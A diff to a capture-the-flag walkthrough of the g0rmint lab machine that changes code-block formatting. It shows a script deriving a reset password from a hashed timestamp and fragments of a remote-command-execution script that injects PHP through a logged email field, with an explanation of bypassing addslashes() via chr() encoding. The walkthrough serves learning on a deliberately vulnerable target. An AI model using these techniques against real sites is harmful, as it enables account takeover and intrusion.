@@ -354,7 +354,7 @@ Let's give a shot to `(email:w3bdrill3r@gmail.com)` and `(username:noman)` and s
 
 I wrote `reset.sh` to simplify the process of getting the "new" password in plaintext.
 
-```bash
+{% highlight bash linenos %}
 # cat reset.sh
 #!/bin/bash
 
@@ -362,7 +362,7 @@ echo -n "$1" | sha1sum | cut -d' ' -f1 | cut -c1-20
 
 # ./reset.sh "Friday 2nd of February 2018 02:08:53 PM"
 30e1a63a8968b727f276
-```
+{% endhighlight %}
 ![access](/assets/images/posts/g0rmint-walkthrough/g0rmint-13.png)
 
 The password reset worked!
@@ -385,7 +385,7 @@ When authentication has failed, the value of the email field is logged to a PHP 
 
 I wrote this `bash` script to automate remote command execution.
 
-```bash
+{% highlight bash linenos %}
 # cat exploit.sh
 #!/bin/bash
 
@@ -440,7 +440,7 @@ exploit
 
 # remove cookie jar
 rm -rf cookie
-```
+{% endhighlight %}
 
 The real workhorse of the script is the `encode()` function. This function turns each ASCII characters of the command string into their ordinals. Each ordinal will go into the PHP `chr()` function and concatenate back as a string. This is to bypass [`addslashes()`](http://php.net/manual/en/function.addslashes.php){:.external}{:target='_blank'} that was present in `config.php`.
 
